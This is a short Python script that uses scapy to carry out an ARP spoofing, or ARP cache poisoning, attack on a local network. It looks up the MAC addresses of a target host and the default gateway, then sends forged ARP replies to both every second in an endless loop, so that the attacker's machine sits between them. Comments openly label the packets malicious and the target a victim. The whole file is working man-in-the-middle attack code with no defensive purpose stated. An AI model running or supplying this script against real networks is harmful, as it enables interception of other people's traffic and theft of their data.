import scapy.all as scapy
import time
import os


def arp_spoofing (target_ip, target_MAC, spoof_ip):
    '''
    The function sends a malicious packet to the victim that causes its ARP cache to update
    that the router's MAC address is the attacker's MAC address, and it sends a malicious
    packet to the router that causes its ARP cache to update that the victim's MAC address 
    is the attacker's MAC address.
    '''
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_MAC, psrc = spoof_ip)
    scapy.send(packet, verbose = 0)


# function to find target mac
def find_traget_MAC (ip):
    '''
    The function finds the MAC address by sending a broadcast message to all other devices on the same network.
    '''
    # Building layers to send a broadcast message
    arp_request_broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')  / scapy.ARP(pdst = ip)
    reply = scapy.srp(arp_request_broadcast, timeout = 3, verbose = 0)[0]
    if reply:
        return reply[0][1].src
    return None


def wait_till_find_MAC (ip):
    '''
    The function runs the function that finds the mac address and returns the mac address only when it is found.
    '''
    mac = None
    while not mac:
        mac = find_traget_MAC(ip)
        # If the address is not found - the value of the variable is still None, print an appropriate message and return to the beginning of the loop
        if not mac:
            print(f"MAC address for {ip} not found\n")
    return mac


# IP Address
default_gateway_ip = os.getenv("default_gateway_IP")
victim_ip = os.getenv("target_IP")

# MAC Address
default_gateway_MAC = wait_till_find_MAC (default_gateway_ip)
victim_MAC = wait_till_find_MAC (victim_ip)


# Malicious packets are sent endlessly because the malicious packets are in a "time race" with automatic packets that are sent and update the arp cache
while True:
    # Malicious packet to the victim
    arp_spoofing (victim_ip, victim_MAC, default_gateway_ip)
    print("A malicious packet was sent to the victim")
    # Malicious packet to the router
    arp_spoofing (default_gateway_ip, default_gateway_MAC, victim_ip)
    print("A malicious packet was sent to the router")
    # So that the code doesn't crash from the overload of an infinite loop
    time.sleep(1)